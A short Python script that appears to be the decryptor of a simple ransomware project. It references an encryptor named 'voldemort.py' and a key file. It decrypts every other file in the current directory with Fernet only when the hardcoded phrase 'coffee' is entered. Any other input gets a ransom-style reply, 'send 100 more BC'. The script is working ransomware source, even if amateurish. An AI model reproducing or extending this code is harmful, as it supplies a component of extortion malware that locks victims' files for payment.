import os
from cryptography.fernet import Fernet


# Finde Files
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
         files.append(file)
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "coffee"
user_phrase = input("Eter secret phrace to decrypt files\n")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decryped = Fernet(secretkey).decrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contents_decryped)
    print("congraulations!! You End")
else:
    print("Wrong code send 100 more BC")